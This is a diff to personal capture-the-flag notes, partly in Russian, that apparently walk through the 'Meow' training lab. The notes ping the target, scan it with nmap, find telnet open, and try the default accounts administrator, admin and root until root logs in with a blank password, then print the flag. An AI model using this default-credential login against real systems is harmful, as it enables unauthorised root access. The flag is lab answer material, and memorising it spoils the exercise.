@@ -1,16 +1,57 @@
 *** MEOW ***
 
-TELNET 
+
+CHECK TARGET 
+	
+	@ ping <ip> # проверка существования цели
+		
+		64 bytes from 10.129.226.234: icmp_seq=1 ttl=63 time=85.3 ms
+
+
+NMAP SCANNING HOST: 
 
 	@ sudo pacman -S inetutils // содержит пакет telnet
 
-	@ nmap <ip>
+	@ nmap -sV <ip>
 		
 		telnet 23/TCP
 
-	@ telnet  <ip> 
 
-		~ cat flag.txt
+TELNET EXPLOTATION
+
+
+	### В telnet существует учетные записи с помощью которых можно входить
+	без пароля
+		
+		- administrator
+		
+		- admin
+		
+		- root
+	
+	@ telnet  <ip> 
+		
+		Meow login: administrator
+			
+			Login incorrect	
+		
+		Meow login: admin
+			
+			Login incorrect	
+
+		Meow login: root
+		Password:				# оставить пустым и нажать Enter
+
+			
+			Successfully connected
+
+			root@~ ls 
+				
+			root@~ cat flag.txt 
+				
+				b40abdfe23665f766f9c61ecba8a4c19
+
+
 
 
 	
